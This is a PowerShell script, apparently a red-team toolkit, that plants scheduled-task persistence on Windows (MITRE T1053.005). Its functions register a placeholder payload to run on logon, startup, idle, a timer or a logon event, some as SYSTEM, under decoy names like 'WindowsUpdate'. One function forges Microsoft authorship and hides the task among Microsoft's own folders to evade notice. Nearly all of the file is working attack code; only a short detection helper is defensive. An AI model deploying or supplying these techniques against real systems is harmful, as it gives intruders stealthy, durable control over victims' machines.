<#
.SYNOPSIS
    Scheduled task persistence techniques for Windows.
.DESCRIPTION
    Create persistence via scheduled tasks with various triggers:
    on logon, idle, startup, event, recurring timer.
    Includes cleanup functions and XML templates.
.NOTES
    MITRE ATT&CK: T1053.005 — Scheduled Task
#>

function New-PersistOnLogon {
    param(
        [string]$TaskName = "WindowsUpdate",
        [string]$Command = "C:\temp\payload.exe",
        [string]$Arguments = "",
        [string]$RunAs = $env:USERNAME
    )
    schtasks /Create /TN $TaskName /TR "$Command $Arguments" /SC ONLOGON /RU $RunAs /F 2>$null
    Write-Output "[+] Task '$TaskName' — runs on logon as $RunAs"
}

function New-PersistOnStartup {
    param(
        [string]$TaskName = "SystemHealthCheck",
        [string]$Command = "C:\temp\payload.exe"
    )
    schtasks /Create /TN $TaskName /TR $Command /SC ONSTART /RU SYSTEM /F 2>$null
    Write-Output "[+] Task '$TaskName' — runs on system startup as SYSTEM"
}

function New-PersistOnIdle {
    param(
        [string]$TaskName = "SystemMaintenance",
        [string]$Command = "C:\temp\payload.exe",
        [int]$IdleMinutes = 10
    )
    schtasks /Create /TN $TaskName /TR $Command /SC ONIDLE /I $IdleMinutes /RU $env:USERNAME /F 2>$null
    Write-Output "[+] Task '$TaskName' — runs after $IdleMinutes minutes idle"
}

function New-PersistRecurring {
    param(
        [string]$TaskName = "TelemetryUpload",
        [string]$Command = "C:\temp\payload.exe",
        [int]$IntervalMinutes = 30
    )
    schtasks /Create /TN $TaskName /TR $Command /SC MINUTE /MO $IntervalMinutes /RU $env:USERNAME /F 2>$null
    Write-Output "[+] Task '$TaskName' — runs every $IntervalMinutes minutes"
}

function New-PersistOnEvent {
    param(
        [string]$TaskName = "SecurityAudit",
        [string]$Command = "C:\temp\payload.exe",
        [string]$EventLog = "Security",
        [int]$EventID = 4624
    )
    $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0"&gt;&lt;Select Path="$EventLog"&gt;*[System[EventID=$EventID]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>$Command</Command>
    </Exec>
  </Actions>
  <Principals>
    <Principal>
      <UserId>$env:USERDOMAIN\$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
</Task>
"@
    $xmlPath = "$env:TEMP\task_$TaskName.xml"
    $xml | Out-File -FilePath $xmlPath -Encoding unicode
    schtasks /Create /TN $TaskName /XML $xmlPath /F 2>$null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Task '$TaskName' — triggers on EventID $EventID in $EventLog log"
}

function New-HiddenTask {
    param(
        [string]$TaskName = "MicrosoftEdgeUpdate",
        [string]$Command = "C:\temp\payload.exe",
        [string]$TaskFolder = "\Microsoft\Windows\Customer Experience Improvement Program"
    )
    $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>This task collects and uploads autochk SQM data if opted-in.</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Actions>
    <Exec><Command>$Command</Command></Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
</Task>
"@
    $xmlPath = "$env:TEMP\task_hidden.xml"
    $xml | Out-File -FilePath $xmlPath -Encoding unicode
    $fullName = "$TaskFolder\$TaskName"
    schtasks /Create /TN $fullName /XML $xmlPath /F 2>$null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Hidden task: $fullName (blends with Microsoft tasks)"
}

function Remove-PersistTask {
    param([string]$TaskName)
    schtasks /Delete /TN $TaskName /F 2>$null
    Write-Output "[-] Removed task: $TaskName"
}

function Detect-SuspiciousTasks {
    Write-Output "[*] Non-Microsoft scheduled tasks:`n"
    Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
        $_.Author -notmatch 'Microsoft' -and
        $_.TaskPath -notmatch '\\Microsoft\\'
    } | ForEach-Object {
        $actions = $_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }
        Write-Output "  Task   : $($_.TaskPath)$($_.TaskName)"
        Write-Output "  State  : $($_.State)"
        Write-Output "  RunAs  : $($_.Principal.UserId)"
        Write-Output "  Action : $($actions -join '; ')"
        Write-Output "  Hidden : $($_.Settings.Hidden)"
        Write-Output ""
    }
}

Write-Output @"
[*] Scheduled Task Persistence Functions Loaded:

    Plant:
      New-PersistOnLogon    -TaskName "Update" -Command "C:\temp\payload.exe"
      New-PersistOnStartup  -TaskName "Health" -Command "C:\temp\payload.exe"  (SYSTEM)
      New-PersistOnIdle     -TaskName "Maint"  -Command "C:\temp\payload.exe" -IdleMinutes 10
      New-PersistRecurring  -TaskName "Sync"   -Command "C:\temp\payload.exe" -IntervalMinutes 30
      New-PersistOnEvent    -TaskName "Audit"  -Command "C:\temp\payload.exe" -EventID 4624
      New-HiddenTask        -TaskName "EdgeUpd" -Command "C:\temp\payload.exe"

    Cleanup:
      Remove-PersistTask -TaskName "Update"

    Detection:
      Detect-SuspiciousTasks
"@
